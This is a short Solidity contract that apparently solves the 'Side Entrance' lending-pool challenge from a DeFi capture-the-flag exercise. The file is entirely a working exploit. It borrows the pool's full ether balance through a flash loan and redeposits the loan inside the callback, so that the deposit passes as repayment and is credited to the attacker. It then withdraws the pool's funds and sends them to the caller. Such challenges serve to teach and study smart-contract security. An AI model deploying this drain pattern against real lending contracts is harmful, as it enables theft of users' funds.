pragma solidity ^0.6.0;

import "./SideEntranceLenderPool.sol";

contract SideFlashLoan is IFlashLoanEtherReceiver {

    SideEntranceLenderPool public pool;

    receive() external payable {}

    function drain(address lpool) public {
        pool = SideEntranceLenderPool(lpool);
        pool.flashLoan(address(lpool).balance);
        pool.withdraw();
        msg.sender.transfer(address(this).balance);
    }

    function execute() external payable override {
        SideEntranceLenderPool(msg.sender).deposit{ value: msg.value }();
    }

}